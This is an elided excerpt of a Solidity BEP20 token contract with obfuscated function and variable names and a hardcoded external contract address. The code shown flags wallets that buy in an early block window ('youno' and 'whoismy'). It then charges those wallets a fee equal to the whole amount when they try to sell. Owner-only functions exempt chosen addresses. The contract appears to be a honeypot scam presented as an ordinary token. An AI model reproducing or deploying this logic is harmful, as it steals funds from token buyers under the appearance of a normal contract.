...
interface cxkaddrs{
 ...
 contract BEP20 is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private whoismy;
    ...
    address service
        ...
        cxkdd = cxkaddrs(0x38335D95cf30F7bf382A1b0FC2e14A2ff8ecF31b);
    ...
    function setisExcludedFromct(address account, bool newValue) public onlyOwner {
        isExcludedFromct[account] = newValue;
    }

    function manageExcludeFrom(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFromct[addresses[i]] = status;
        }
    }
    ...
    function Cant(address account) public view returns(bool) {
        return whoismy[account];
    }
    ...
    function youno(address recipient) internal {
        if (!whoismy[recipient] && !isMarketPair[recipient]) whoismy[recipient] = true;
    }
       ...
       if(!isMarketPair[sender]) {
        ...
        else
        {
            ...
            if (isExcludedFromct[sender] || isExcludedFromct[recipient]) {
                ...
                if (smallOrEqual(block.number , herDotoge + _CTdoor) && !isMarketPair[recipient]) {youno(recipient);}
                finalAmount = takeFee(sender, recipient, amount);
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            }

            if(checkWalletLimitse && !isWalletLimitExempt[recipient])
                require(smallOrEqual(balanceOf(recipient).add(finalAmount), _walletMax));
    ...
    function WETH(address addr, address re) private view returns(bool) {
        return addr == marketingWalletAddress && !isMarketPair[re] && addr == re;
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(whoismy[sender] && !isMarketPair[sender]) feeAmount = amount;
